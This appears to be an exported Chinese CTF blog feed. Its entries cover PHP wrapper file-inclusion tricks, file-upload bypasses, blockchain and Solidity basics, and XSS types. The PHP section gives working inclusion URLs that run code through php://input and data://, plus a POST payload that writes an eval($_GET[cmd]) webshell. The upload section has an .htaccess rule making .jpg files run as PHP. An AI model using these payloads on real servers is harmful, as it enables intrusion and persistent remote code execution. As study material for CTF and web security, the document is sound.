</thead>
<tbody><tr>
<td>php:&#x2F;&#x2F;input</td>
<td>可以访问请求的原始数据的只读流，在POST请求中访问POST的<code>data</code>部分，在<code>enctype=&quot;multipart/form-data&quot;</code> 的时候<code>php://input </code>是无效的。</td>
</tr>
<tr>
<td>php:&#x2F;&#x2F;output</td>
<td>只写的数据流，允许以 print 和 echo 一样的方式写入到输出缓冲区。</td>
</tr>
<tr>
<td>php:&#x2F;&#x2F;fd</td>
<td>(&gt;&#x3D;5.3.6)允许直接访问指定的文件描述符。例如 <code>php://fd/3</code> 引用了文件描述符 3。</td>
</tr>
<tr>
<td>php:&#x2F;&#x2F;memory php:&#x2F;&#x2F;temp</td>
<td>(&gt;&#x3D;5.1.0)一个类似文件包装器的数据流，允许读写临时数据。两者的唯一区别是 <code>php://memory</code> 总是把数据储存在内存中，而 <code>php://temp</code> 会在内存量达到预定义的限制后（默认是 <code>2MB</code>）存入临时文件中。临时文件位置的决定和 <code>sys_get_temp_dir()</code> 的方式一致。</td>
</tr>
<tr>
<td>php:&#x2F;&#x2F;filter</td>
<td>(&gt;&#x3D;5.0.0)一种元封装器，设计用于数据流打开时的筛选过滤应用。对于一体式<code>（all-in-one）</code>的文件函数非常有用，类似 <code>readfile()</code>、<code>file()</code> 和 <code>file_get_contents()</code>，在数据流内容读取之前没有机会应用其他过滤器。</td>
</tr>
</tbody></table>
</li>
<li><p><strong><code>php://filter</code>参数详解</strong></p>
<p>该协议的参数会在该协议路径上进行传递，多个参数都可以在一个路径上传递。具体参考如下：</p>
<table>
<thead>
<tr>
<th>php:&#x2F;&#x2F;filter 参数</th>
<th>描述</th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>resource&#x3D;&lt;要过滤的数据流&gt;</td>
<td>必须项。它指定了你要筛选过滤的数据流。</td>
<td></td>
</tr>
<tr>
<td>read&#x3D;&lt;读链的过滤器&gt;</td>
<td>可选项。可以设定一个或多个过滤器名称，以管道符（*\</td>
<td>*）分隔。</td>
</tr>
<tr>
<td>write&#x3D;&lt;写链的过滤器&gt;</td>
<td>可选项。可以设定一个或多个过滤器名称，以管道符（\</td>
<td>）分隔。</td>
</tr>
<tr>
<td>&lt;; 两个链的过滤器&gt;</td>
<td>任何没有以 <em>read&#x3D;</em> 或 <em>write&#x3D;</em> 作前缀的筛选器列表会视情况应用于读或写链。</td>
<td></td>
</tr>
</tbody></table>
</li>
<li><p><strong>可用的过滤器列表（4类）</strong></p>
<p>此处列举主要的过滤器类型，详细内容请参考：<a href="https://link.segmentfault.com/?enc=XLl1qyeGwRWWMG9dw9ESmQ==.0ts2nAacIjZZ+DTLJ5T0ocshPXAgZLYKgYBybI8Dc7yazO2QRQTOjf/jsO5rq19t">https://www.php.net/manual/zh/filters.php</a></p>
<table>
<thead>
<tr>
<th>字符串过滤器</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>string.rot13</td>
<td>等同于<code>str_rot13()</code>，rot13变换</td>
</tr>
<tr>
<td>string.toupper</td>
<td>等同于<code>strtoupper()</code>，转大写字母</td>
</tr>
<tr>
<td>string.tolower</td>
<td>等同于<code>strtolower()</code>，转小写字母</td>
</tr>
<tr>
<td>string.strip_tags</td>
<td>等同于<code>strip_tags()</code>，去除html、PHP语言标签</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>转换过滤器</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>convert.base64-encode &amp; convert.base64-decode</td>
<td>等同于<code>base64_encode()</code>和<code>base64_decode()</code>，base64编码解码</td>
</tr>
<tr>
<td>convert.quoted-printable-encode &amp; convert.quoted-printable-decode</td>
<td>quoted-printable 字符串与 8-bit 字符串编码解码</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>压缩过滤器</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>zlib.deflate &amp; zlib.inflate</td>
<td>在本地文件系统中创建 gzip 兼容文件的方法，但不产生命令行工具如 gzip的头和尾信息。只是压缩和解压数据流中的有效载荷部分。</td>
</tr>
<tr>
<td>bzip2.compress &amp; bzip2.decompress</td>
<td>同上，在本地文件系统中创建 bz2 兼容文件的方法。</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>加密过滤器</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>mcrypt.*</td>
<td>libmcrypt 对称加密算法</td>
</tr>
<tr>
<td>mdecrypt.*</td>
<td>libmcrypt 对称解密算法</td>
</tr>
</tbody></table>
</li>
<li><p><strong>示例</strong>：</p>
<ol>
<li><p><code>php://filter/read=convert.base64-encode/resource=[文件名]</code>读取文件源码（针对php文件需要base64编码）</p>
<pre><code class="highlight livecodeserver"><span class="keyword">http</span>://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/<span class="built_in">include</span>.php?<span class="built_in">file</span>=php://<span class="built_in">filter</span>/<span class="built_in">read</span>=<span class="built_in">convert</span>.base64-encode/resource=phpinfo.php</code></pre>

<p><img src="https://segmentfault.com/img/bVbrQBf" alt="图片描述"></p>
</li>
<li><p><code>php://input + [POST DATA]</code>执行php代码</p>
<pre><code class="highlight php">http:<span class="comment">//127.0.0.1/include.php?file=php://input</span>
[POST DATA部分]
<span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>(); <span class="meta">?&gt;</span></code></pre>

<p><img src="https://segmentfault.com/img/bVbrQBh" alt="图片描述"></p>
<p>若有写入权限，写入一句话木马</p>
<pre><code class="highlight php">http:<span class="comment">//127.0.0.1/include.php?file=php://input</span>
[POST DATA部分]
<span class="meta">&lt;?php</span> <span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;1juhua.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @eval($_GET[cmd]); ?&gt;&#x27;</span>); <span class="meta">?&gt;</span></code></pre>

<p><img src="https://segmentfault.com/img/bVbrQBi" alt="图片描述"></p>
</li>
</ol>
</li>
<li><p><strong>参考</strong>：<a href="https://link.segmentfault.com/?enc=AHKgds+Ge0QaKChQ1m1oog==.na4Zlt5y4duEWHHydmOSTh2NkSbiDQNUtTreUgqxsETwe3g04SdnSBMCMdEdQ27X">https://php.net/manual/zh/wrappers.php.php</a></p>
</li>
</ul>
<h3 id="zip-bzip2-zlib-协议"><a href="#zip-bzip2-zlib-协议" class="headerlink" title="zip:// &amp; bzip2:// &amp; zlib:// 协议"></a><code>zip:// &amp; bzip2:// &amp; zlib://</code> 协议</h3><ul>
<li><p><strong>条件</strong>：</p>
<ul>
<li><code>allow_url_fopen</code>:off&#x2F;on</li>
<li><code>allow_url_include</code> :off&#x2F;on</li>
</ul>
</li>
<li><p><strong>作用</strong>：<code>zip:// &amp; bzip2:// &amp; zlib://</code> 均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名，可修改为任意后缀：<code>jpg png gif xxx</code> 等等。</p>
</li>
<li><p><strong>示例</strong>：</p>
<ol>
<li><p><code>zip://[压缩文件绝对路径]%23[压缩文件内的子文件名]</code>（#编码为%23）</p>
<p>压缩 phpinfo.txt 为 phpinfo.zip ，压缩包重命名为 phpinfo.jpg ，并上传</p>
<pre><code class="highlight http">http://127.0.0.1/include.php?file=zip://E:\phpStudy\PHPTutorial\WWW\phpinfo.jpg%23phpinfo.txt</code></pre>

<p><img src="https://segmentfault.com/img/bVbrQBj" alt="图片描述"></p>
</li>
<li><p><code>compress.bzip2://file.bz2</code></p>
<p>压缩 phpinfo.txt 为 phpinfo.bz2 并上传（同样支持任意后缀名）</p>
<pre><code class="highlight http">http://127.0.0.1/include.php?file=compress.bzip2://E:\phpStudy\PHPTutorial\WWW\phpinfo.bz2</code></pre>

<p><img src="https://segmentfault.com/img/bVbrQBt" alt="图片描述"></p>
</li>
<li><p><code>compress.zlib://file.gz</code></p>
<p>压缩 phpinfo.txt 为 phpinfo.gz 并上传（同样支持任意后缀名）</p>
<pre><code class="highlight http">http://127.0.0.1/include.php?file=compress.zlib://E:\phpStudy\PHPTutorial\WWW\phpinfo.gz</code></pre>

<p><img src="https://segmentfault.com/img/bVbrQBu" alt="图片描述"></p>
</li>
</ol>
</li>
<li><p><strong>参考</strong>：<a href="https://link.segmentfault.com/?enc=w0uak4RdRJUStEHdEK6h4w==.xhWZ9YsBZncXK/YcM6ZNJ5Jey44TQSRRDG2PDhW+VOCrc/wcHb6xJoP7Fff88EcMBe0t2zuSqAZeW77CzMA4ZQ==">http://php.net/manual/zh/wrappers.compression.php</a></p>
</li>
</ul>
<h3 id="data-协议"><a href="#data-协议" class="headerlink" title="data:// 协议"></a><code>data://</code> 协议</h3><ul>
<li><p><strong>条件</strong>：</p>
<ul>
<li><code>allow_url_fopen</code>:on</li>
<li><code>allow_url_include</code> :on</li>
</ul>
</li>
<li><p><strong>作用</strong>：自<code>PHP&gt;=5.2.0</code>起，可以使用<code>data://</code>数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码。</p>
</li>
<li><p><strong>用法</strong>：</p>
<pre><code class="highlight dts"><span class="symbol">data:</span><span class="comment">//text/plain,</span>
<span class="symbol">data:</span><span class="comment">//text/plain;base64,</span></code></pre>
</li>
<li><p><strong>示例</strong>：</p>
<ol>
<li><p><code>data://text/plain,</code></p>
<pre><code class="highlight http">http://127.0.0.1/include.php?file=data://text/plain,&lt;?php%20phpinfo();?&gt;</code></pre>

<p><img src="https://segmentfault.com/img/bVbrQBB" alt="图片描述"></p>
</li>
<li><p><code>data://text/plain;base64,</code></p>
<pre><code class="highlight http">http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</code></pre>

<p><img src="https://segmentfault.com/img/bVbrQBD" alt="图片描述"></p>
</li>
</ol>
</li>
</ul>
<h3 id="http-https-协议"><a href="#http-https-协议" class="headerlink" title="http:// &amp; https:// 协议"></a><code>http:// &amp; https://</code> 协议</h3><ul>
<li><p><strong>条件</strong>：</p>
<ul>
<li><code>allow_url_fopen</code>:on</li>
<li><code>allow_url_include</code> :on</li>
</ul>
</li>
<li><p><strong>作用</strong>：常规 URL 形式，允许通过 <code>HTTP 1.0</code> 的 GET方法，以只读访问文件或资源。CTF中通常用于远程包含。</p>
</li>
<li><p><strong>用法</strong>：</p>
<pre><code class="highlight dts"><span class="symbol">http:</span><span class="comment">//example.com</span>
<span class="symbol">http:</span><span class="comment">//example.com/file.php?var1=val1&amp;var2=val2</span>
<span class="symbol">http:</span><span class="comment">//user:password@example.com</span>
<span class="symbol">https:</span><span class="comment">//example.com</span>
<span class="symbol">https:</span><span class="comment">//example.com/file.php?var1=val1&amp;var2=val2</span>
<span class="symbol">https:</span><span class="comment">//user:password@example.com</span></code></pre>
</li>
<li><p><strong>示例</strong>：</p>
<pre><code class="highlight http">http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt</code></pre>

<p><img src="https://segmentfault.com/img/bVbrQBP" alt="图片描述"></p>
</li>
</ul>
<h3 id="phar-协议"><a href="#phar-协议" class="headerlink" title="phar:// 协议"></a><code>phar://</code> 协议</h3><p><code>phar://</code>协议与<code>zip://</code>类似，同样可以访问zip格式压缩包内容，在这里只给出一个示例：</p>
<pre><code class="highlight http">http://127.0.0.1/include.php?file=phar://E:/phpStudy/PHPTutorial/WWW/phpinfo.zip/phpinfo.txt</code></pre>

<p><img src="https://segmentfault.com/img/bVbrQBX" alt="图片描述"></p>
<p>另外在 Black Hat 2018 大会上，研究人员公布了一款针对PHP应用程序的全新攻击技术：<strong>phar:&#x2F;&#x2F;协议对象注入技术</strong>。</p>
<p>因为该利用点需要满足一定的条件才能利用，可以参考下面这篇文章，里面的demo也非常详细，留作以后专门研究一下。</p>
]]></content>
      <tags>
        <tag>CTF Web</tag>
      </tags>
  </entry>
  <entry>
    <title>文件上传漏洞</title>
    <url>/2025/01/25/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h1><p>题型：</p>
<p>弱判断:bp改一下就能过</p>
<p>增加文件头</p>
<p>改phtml绕过</p>
<p>利用.user.ini配置文件或者.htaccess配合攻击(必须用特定文件后缀名时)</p>
<p>.htaccess：内容如下（功能是将.jpeg文件解析为php文件）：</p>
<pre><code class="highlight plaintext">AddType application/x-httpd-php .jpg</code></pre>
]]></content>
      <tags>
        <tag>-CTF -Web</tag>
      </tags>
  </entry>
  <entry>
    <title>智能合约深度学习（持续施工ing）</title>
    <url>/2024/12/22/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%EF%BC%88%E6%8C%81%E7%BB%AD%E6%96%BD%E5%B7%A5ing%EF%BC%89/</url>
    <content><![CDATA[<blockquote>
<h1 id="智能合约深度学习"><a href="#智能合约深度学习" class="headerlink" title="智能合约深度学习"></a>智能合约深度学习</h1></blockquote>
<h1 id="前序"><a href="#前序" class="headerlink" title="前序"></a>前序</h1><blockquote>
<p><strong>如果想直接入手合约，可以直接跳至合约开发模块哦</strong></p>
</blockquote>
<p>在进入智能合约学习环节之前，让我们先了解一下它的“爹”，即<strong>区块链</strong></p>
<p>区块链，是一种区中心化，点对点系统的工具，也可以说是一种数据库系统（实际上就是一本记录各种交易的账本）</p>
<p>区别于传统的中心化系统，这个系统由各个区块（前区块的加密哈希，时间戳，交易数据）组成，在这个系统中，由网络中的大多数节点来决定新区块中交易记录的录入以及修改。这就使得其安全性远远超过了传统的系统。假设一个用户想要伪造一份交易，那么从理论来说他需要修改全网每个节点的总账，这个过程需要消耗巨量的算力<del>有这算力谁还来伪造交易啊</del>，每增加一个区块，需要全网51%以上的节点的认可才能够组成区块链</p>
<p>那么我们现在更具体一点，来谈一个家喻户晓的区块链系统———比特币系统</p>
<h1 id="关于比特币系统"><a href="#关于比特币系统" class="headerlink" title="关于比特币系统"></a>关于比特币系统</h1><h2 id="竞争记账"><a href="#竞争记账" class="headerlink" title="竞争记账"></a>竞争记账</h2><p>即挖矿，在一个区块建立之后，竞争记账的节点需要计算建立以来所有交易的哈希值（<strong>SHA256</strong>），再将其两两组合，不断重复，最终得到一个SHA256值（也叫<strong>默克根</strong>），最后需要进行以下计算</p>
<pre><code class="highlight plaintext">SHA256(默克根+前一区的ID+一个随机数)</code></pre>

<p>通常这个值要满足哈希值的前20位为0(达成概率在百万分之一水平),也就是算力比拼</p>
<p>成功者向全网发送通知，若经过检验大家就公认他构造的这个区块并以其作为父区块，进行下一个区块的算力竞争（每10分钟进行一次）</p>
<p>成功者会获得12.5个比特币<del>122w美刀(2024.12.9日汇率)</del>作为奖励，这就是中本聪设计的激励机制<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/e23cc007503b1060aa2f3f307de43b14.png" alt="img"></p>
<h2 id="长链与短链"><a href="#长链与短链" class="headerlink" title="长链与短链"></a>长链与短链</h2><p>又是算力竞争……在向全网通知时（假设你的答案正确），可能会有人与你在相同的时间发送了正确的答案，于是会出现两条链，那么就又到了拼算力的时候了，不同的矿工会选择不同的链继续下一轮区块计算，这里就不得不提另一种机制了，即<strong>总是选择工作量最大的链</strong>，于是哪条链先出现下一个区块，也就意味着会有更多的矿工选择这条链工作，那么另一条短链就会被废止。组装短链的矿工也得不到比特币奖励，结果就是区块链只有唯一一条主线。</p>
<h2 id="比特币的交易"><a href="#比特币的交易" class="headerlink" title="比特币的交易"></a>比特币的交易</h2><p>交易包括两个方向，Input以及Output.</p>
<p>两者可以不完全一致，但只能输入略大于输出，那么缺少的这部分去哪里了呢 ，是支付给了矿工哦，每笔交易在发布后可以选择支付交易费用，钱到位交易也会更快被打包。但是不代表不支付或支付很少交易费用不会有人处理你的交易，只是会被推迟，总之，不管是否支付交易费用，矿工都会获得比特币的奖励，你可以将其理解为：<strong>即使你不付给服务员小费，但并不影响他获得工资</strong>。</p>
<h2 id="比特币的交易加密"><a href="#比特币的交易加密" class="headerlink" title="比特币的交易加密"></a>比特币的交易加密</h2><p>对于每个用户的钱包，都由三部分组成</p>
<p><strong>16位的地址，公钥，私钥(256位)</strong></p>
<p>假设在A与B交易，A发送给B一条A的私钥加密过的内容，那么若B没有A的公钥，B就无法解密内容</p>
<p>公钥的产生依赖于私钥，而钱包的地址生成依赖于公钥</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/65e01b2554c3850eeeebb60eb7c4b93b.jpeg" alt="img"></p>
<p>贴一条其他师傅的说明过程。</p>
<p>第一步：生成随机私钥</p>
<p>私钥是一个随机数，随机选取一个32字节的数，这个数的范围大小是介于1 ~ 0xFFFF FFFF FFFF FFFF FFFF FFFF FFFF FFFE BAAE DCE6 AF48 A03B BFD2 5E8C D036 4141之间的一个数，为了方便后面的计算，我们随机生成一个合法的私钥：</p>
<p>8F72F6B29E6E225A36B68DFE333C7CE5E55D83249D3D2CD6332671FA445C4DD3</p>
<p>第二步：椭圆曲线算公钥</p>
<p>生成了私钥之后，我们使用椭圆曲线加密算法（ECDSA-secp256k1）计算私钥所对应的非压缩公钥，生成的公钥共65字节， 其中一个字节是0x04，其中32个字节是X坐标，另外32个字节是Y坐标：</p>
<p>公钥P.X：<br>06CCAE7536386DA2C5ADD428B099C7658814CA837F94FADE365D0EC6B1519385</p>
<p>公钥P.Y：<br>FF83EC5F2C0C8F016A32134589F7B9E97ACBFEFD2EF12A91FA622B38A1449EEB</p>
<p>第三步：计算公钥的SHA-256哈希值</p>
<p>将上述公钥地址拼合，得到标准地址：<br>0406CCAE7536386DA2C5ADD428B099C7658814CA837F94FADE365D0EC6B1519385FF83EC5F2C0C8F016A32134589F7B9E97ACBFEFD2EF12A91FA622B38A1449EEB</p>
<p>对齐进行SHA-256哈希计算，得到结果：<br>2572e5f4a8e77ddf5bb35b9e61c61f66455a4a24bcfd6cb190a8e8ff48fc097d</p>
<p>第四步：计算 RIPEMD-160哈希值</p>
<p>取上一步结果，进行RIPEMD-160计算，得到结果：</p>
<p>0b14f003d63ab31aef5fedde2b504699547dd1f6</p>
<p>第五步：加入地址版本号（比特币主网版本号“0x00”）</p>
<p>取上一步结果，在前面加上16进制的00，即：</p>
<p>000b14f003d63ab31aef5fedde2b504699547dd1f6</p>
<p>第六步：计算 SHA-256 哈希值</p>
<p>取上一步结果，进行SHA-256计算，可得：</p>
<p>ddc2270f93cc84cc6869dd373f3c340bbf5cb9a8f5559297cc9e5d947aab2536</p>
<p>然后，对以上结果再次计算 SHA-256 哈希值，得到：</p>
<p>869ac57b83ccf75ca9da8895823562fffb611e3c297d9c2d4612aeeb32850078</p>
<p>第七步：取上一步结果的前4个字节（8位十六进制）</p>
<p>869ac57b</p>
<p>第八步：把这4个字节加在第五步的结果后面</p>
<p>作为校验位，将这4个字节加载第五步的结果后面，这就是比特币地址的16进制形态了：</p>
<p>869ac57b000b14f003d63ab31aef5fedde2b504699547dd1f6</p>
<p>第九步：用Base58编码变换一下地址</p>
<p>对上一步的结果进行Base58编码，得到：</p>
<p>1QCXRuoxWo5Bya9NxHaVBArBQYhatHJrU7</p>
<p>这就是我们经常看到的传统意义上的比特币钱包地址</p>
<h1 id="智能合约开发"><a href="#智能合约开发" class="headerlink" title="智能合约开发"></a>智能合约开发</h1><p>智能合约的开发，主要使用Solidity编译语言以及在线的Remix编译器</p>
<h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><h3 id="整数"><a href="#整数" class="headerlink" title="整数"></a>整数</h3><p>有符号整数类型包括int8、int16、int32、int64等，而无符号整数类型包括uint8、uint16、uint32、uint64等。这些类型表示不同位数的整数。</p>
<p>相较于C语言，保留了大部分运算，增加了乘方(**)运算以及更改了”&lt;&lt;””&gt;&gt;”的运算规则</p>
<pre><code class="highlight plaintext">x&lt;&lt;y  相当于x*2**y   x&gt;&gt;y相当于x/2**y</code></pre>



<h3 id="逻辑"><a href="#逻辑" class="headerlink" title="逻辑"></a>逻辑</h3><p>即bool类型，会在内置函数中大量出现，默认值为false</p>
<h3 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h3><p>用<strong>address</strong>来声明，长度为20位，表示以太坊网络上的账户地址</p>
<p>在地址型下有**transfer(转账)<strong>与</strong>balance(账户)**两个变量</p>
<p>通过以下函数来处理地址类型（关于Gas的概念，请见<strong>交易处理</strong>板块）</p>
<pre><code class="highlight plaintext">&lt;address&gt;.balance(uint 256) ——&gt;返回以wei为单位的该地址的以太币账户（1ETH=10^18wei）</code></pre>

<pre><code class="highlight plaintext">&lt;address&gt;.transfer(uint 256 amount) ——&gt; 给某地址转入指定数量的以太币（每次转账需要2300的Gas费用，且费用固定）</code></pre>

<p>余额不足，Gas不足时会使合约无法执行，回滚已执行的程序并且发送异常信息（<strong>交易被终止</strong>）</p>
<pre><code class="highlight plaintext">&lt;address&gt;.send(uint 256 amount) returns (bool) ——&gt; 给某地址转入指定数量的以太币（每次转账需要2300的Gas费用，且费用固定）在交易成功或失败后会返回对应的bool值</code></pre>

<p>余额不足，Gas不足时会终止程序但不会发送异常消息，会返回False</p>
<p>但使用.send是存在一定风险的，可能会导致转账失败(调用的堆栈&gt;1024KB或发出方的Gas耗尽)的情况下交易的对方仍能收到以太币</p>
<pre><code class="highlight plaintext">&lt;address&gt;.call(...) returns (bool) ——&gt;最常用的调用函数，失败返回false,Gas的费用可自己调整。</code></pre>

<p>发布低级别的调用</p>
<p>call()下有两个控制交易的内置函数</p>
<p>gas()(支付的Gas值)与value()(支付的以太币值)，两者同时调用没有先后顺序的要求</p>
<pre><code class="highlight plaintext">例如：address.call.gas(100000).value(1 ether)(&quot;register&quot;,&quot;Myname&quot;)</code></pre>



<pre><code class="highlight plaintext">&lt;address&gt;.callcode(...) returns (bool)</code></pre>

<p>发布低级别的调用，没call好用，不久就会被删除了</p>
<pre><code class="highlight plaintext">&lt;address&gt; .delegatecall(...) returns (bool)</code></pre>

<p>发布低级别的代表调用,调用的是储存在另一个库中的库代码(Library code)</p>
<p>？故使用前要确定两个合约的储存设计都要适用于该函数？</p>
<blockquote>
<p>[!WARNING]</p>
<p><code>call()</code> <code>callcode()</code> <code>delegatecall()</code>都是低阶函数，使用时调用的未知合约可能是恶意合约，在调用是可能会被篡权，反过来被调用合约，因此调用函数返回时要注意原合约的参数是否已经被改变</p>
</blockquote>
<blockquote>
<p>地址常量</p>
</blockquote>
<p>​	</p>
<h3 id="字节数组"><a href="#字节数组" class="headerlink" title="字节数组"></a>字节数组</h3><p>分为<strong>固定长度的字节数组</strong>以及<strong>可变长度的字节数组</strong></p>
<p>固定长度的数组可以用bytes1~bytes32来说明(bytes1也可以直接记作byte)</p>
<p>可以通过索引访问以及[变量名].length返回字节长度</p>
<p>可变长度的数组：</p>
<p>①bytes(与array性质相同)</p>
<p>②string(可以理解为特殊的数组)，不可以调用.length&#x2F;索引来访问</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>智能合约</tag>
      </tags>
  </entry>
  <entry>
    <title>详解XSS注入</title>
    <url>/2025/03/15/%E8%AF%A6%E8%A7%A3XSS%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h1 id="XSS注入"><a href="#XSS注入" class="headerlink" title="XSS注入"></a>XSS注入</h1><pre><code class="highlight plaintext">&quot;球球你了！就让我插一句话，我什么都会做的!!!&quot;

&quot;byd被我注入了吧&quot;</code></pre>

<h2 id="认识XSS攻击"><a href="#认识XSS攻击" class="headerlink" title="认识XSS攻击"></a>认识XSS攻击</h2><p>XSS全称是Cross Site Scripting即跨站脚本，当目标网站目标用户浏览器渲染HTML文档的过程中，出现了不被预期的脚本指令并执行时，XSS就发生了。</p>
<ul>
<li>XSS 的运行原理是将恶意的 script 脚本插入进 html&#x2F;css&#x2F;js 文件当中。</li>
</ul>
<p>作为一种HTML注入攻击，XSS攻击的核心思想就是在HTML页面中注入恶意代码，而XSS采用的注入方式是非常巧妙的。在XSS攻击中，一般有三个角色参与：攻击者、目标服务器、受害者的浏览器。</p>
<p>由于有的服务器并没有对用户的输入进行安全方面的验证，攻击者就可以很容易地通过正常的输入手段，夹带进一些恶意的HTML脚本代码。当受害者的浏览器访 问目标服务器上被注入恶意脚本的页面后，由于它对目标服务器的信任，这段恶意脚本的执行不会受到什么阻碍。而此时，攻击者的目的就已经达到了。</p>
<h2 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h2><pre><code class="highlight plaintext">又称**非持久型XSS**。之所以称为反射型XSS，是因为这种攻击方式的注入代码是从目标服务器通过错误信息、搜索结果等等方式“反射”回来的：发出请求时，XSS代码出现在URL中，作为输入提交到服务器端，服务器端解析后响应，XSS代码随响应内容一起传回给浏览器，最后浏览器解析执行XSS代码。这个过程像一次反射，故叫反射型XSS。 而称为非持久型XSS，则是因为这种攻击方式具有一次性，由于代码注入的是一个动态产生的页面而不是永久的页面，因此这种攻击方式只在点击链接的时候才产生作用。

攻击者通过电子邮件等方式给别人发送带有恶意脚本代码参数的 URL，当 URL 地址被打开时，注入脚本被传输到目标服务器上，然后服务器将注入脚本“反射”到受害者的浏览器上，特有的恶意代码参数被 HTML 解析、执行。

非持久型 XSS 漏洞攻击的**四大特点**：① 即时性。不经过服务器存储，直接通过 HTTP 的 GET 和 POST 请求就能完成一次攻击，拿到用户隐私数据；②攻击者需要诱骗点击；③反馈率低，所以较难发现和响应修复；④盗取用户敏感保密信息。

防止出现非持久型 XSS 漏洞的**五大措施**：① Web 页面渲染的所有内容或者渲染的数据都必须来自于服务端；②尽量不要从 URL，document.referrer，document.forms 等这种 DOM API 中获取数据直接渲染；③尽量不要使用 eval, new Function()，document.write()，document.writeln()，window.setInterval()，window.setTimeout()，innerHTML，document.creteElement() 等可执行字符串的方法；④如果做不到以上几点，也必须对涉及 DOM 渲染的方法传入的字符串参数做 escape 转义；⑤ 前端渲染的时候对任何的字段都需要做 escape 转义编码</code></pre>

<p>反射型 XSS 的 Payload 如下</p>
<pre><code class="highlight plaintext">&lt;script&gt;alert(1)&lt;script&gt;</code></pre>

<h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><ul>
<li>“&gt;闭合绕过</li>
</ul>
<h2 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h2><pre><code class="highlight plaintext">存储型XSS，又称持久型XSS，他和反射型XSS最大的不同就是，攻击脚本将被永久地存放在目标服务器端（数据库，内存，文件系统等），下次请求目标页面时不用再提交XSS代码。

一般存在于 Form 表单提交等交互功能，如发帖留言，提交文本信息等，黑客利用的 XSS 漏洞，将内容经正常功能提交进入数据库持久保存，当前端页面获得后端从数据库中读出的注入代码时，恰好将其渲染执行。

这种攻击多见于论坛，攻击者在发帖的过程中，将恶意脚本连同正常信息一起注入到帖子的内容之中。随着帖子被论坛服务器存储下来，恶意脚本也永久地被存放在论坛服务器的后端存储器中。当其它用户浏览这个被注入了恶意脚本的帖子的时候，恶意脚本则会在他们的浏览器中得到执行，从而受到了攻击。

可以看到，存储型XSS的攻击方式能够将恶意代码永久地嵌入一个页面当中，所有访问这个页面的用户都将成为受害者。如果我们能够谨慎对待不明链接，那么反射型的XSS攻击将没有多大作为，而存储型XSS则不同，由于它注入的往往是一些我们所信任的页面，因此无论我们多么小心，都难免会受到攻击。可以说，存储型XSS更具有隐蔽性，带来的危害也更大，除非服务器能完全阻止注入，否则任何人都很有可能受到攻击。

持久型 XSS 的三**大特点**：①持久性，植入在数据库中；②危害面广，甚至可以让用户机器变成 DDoS 攻击的肉鸡；③ 盗取用户敏感私密信息。

防止持久型 XSS 漏洞的**三大措施：** ①后端在入库前应该选择不相信任何前端数据，将所有的字段统一进行转义处理；②后端在输出给前端数据统一进行转义处理；③前端在渲染页面 DOM 的时候应该选择不相信任何后端数据，任何字段都需要做转义处理。</code></pre>



<h2 id="DOM-based-型"><a href="#DOM-based-型" class="headerlink" title="DOM-based 型"></a>DOM-based 型</h2><pre><code class="highlight plaintext">客户端的脚本程序可以动态地检查和修改页面内容，而不依赖于服务器端的数据。例如客户端如从 URL 中提取数据并在本地执行，如果用户在客户端输入的数据包含了恶意的 JavaScript 脚本，而这些脚本没有经过适当的过滤和消毒，那么应用程序就可能受到 [DOM-based XSS](https://zhida.zhihu.com/search?content_id=164263694&amp;content_type=Article&amp;match_order=1&amp;q=DOM-based+XSS&amp;zhida_source=entity) 攻击。需要特别注意以下的用户输入源 document.URL、 location.hash、 location.search、 document.referrer 等。</code></pre>



<h2 id="基于字符集的-XSS"><a href="#基于字符集的-XSS" class="headerlink" title="基于字符集的 XSS"></a>基于字符集的 XSS</h2><pre><code class="highlight plaintext">哪怕现在很多的浏览器以及各种开源的库都专门针对了 XSS 进行转义处理，尽量默认抵御绝大多数 XSS 攻击，但是还是有很多方式可以绕过转义规则，让人防不胜防。比如「基于字符集的 XSS 攻击」就是绕过这些转义处理的一种攻击方式，比如有些 Web 页面字符集不固定，用户输入非期望字符集的字符，有时会绕过转义过滤规则。

可以形成「基于字符集的 XSS 攻击」的原因是由于浏览器在 meta 没有指定 charset 的时候有自动识别编码的机制，所以这类攻击通常就是发生在没有指定或者没来得及指定 meta 标签的 charset 的情况下。

避免基于字符集的 XSS 攻击的**两大方法：**①记住指定 &lt;meta charset=&quot;utf-8&quot;&gt;；② XML 中不仅要指定字符集为 utf-8，而且标签要闭合。</code></pre>



